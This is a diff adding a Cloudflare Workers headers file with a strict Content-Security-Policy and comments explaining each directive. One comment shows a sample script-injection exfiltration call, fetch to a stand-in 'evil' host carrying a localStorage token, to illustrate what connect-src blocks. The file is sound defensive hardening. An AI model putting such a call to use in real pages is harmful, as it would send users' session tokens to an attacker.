@@ -1,0 +1,28 @@
+# Cloudflare Workers static-assets headers. This file is config, not content:
+# it is consumed at deploy time and never served.
+
+/*
+  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: DENY
+  Referrer-Policy: strict-origin-when-cross-origin
+  Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=()
+  Cross-Origin-Opener-Policy: same-origin
+  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; media-src 'self'; connect-src 'self' https://api.pandaroc.com http://127.0.0.1:8765; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
+
+# Notes on the CSP above, so the next person does not loosen it by accident:
+#
+# script-src 'self'  — no 'unsafe-inline'. Every page's inline <script> lives in
+#   /js/<page>.js and every former onclick= goes through /js/actions.js. This is
+#   the directive that actually contains an XSS; adding 'unsafe-inline' back
+#   would make the whole policy decorative.
+#
+# style-src keeps 'unsafe-inline' — the pages use hundreds of style="" attributes
+#   and style injection cannot execute script. Worth revisiting, not urgent.
+#
+# connect-src pins the two endpoints the site legitimately talks to. This is what
+#   blocks the exfiltration half of a script-injection attack:
+#   fetch('https://evil/?t=' + localStorage.pandaroc_token) does not leave.
+#   127.0.0.1:8765 is the desktop app's post-payment hand-back from success.html.
+#
+# frame-ancestors 'none' duplicates X-Frame-Options for modern browsers.
